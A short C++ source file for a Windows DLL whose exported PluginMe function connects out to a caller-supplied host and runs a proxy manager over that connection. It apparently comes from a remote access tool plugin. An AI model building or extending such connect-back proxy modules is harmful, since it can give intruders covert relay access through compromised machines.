#include "stdafx.h"
#include "ClientSocket.h"
#include "ProxyManager.h"

extern "C" __declspec(dllexport) BOOL PluginMe(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;

	CProxyManager	manager(&socketClient);
	socketClient.run_event_loop();
	Sleep(100);

	return 0;
}

BOOL APIENTRY mymain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	return TRUE;
}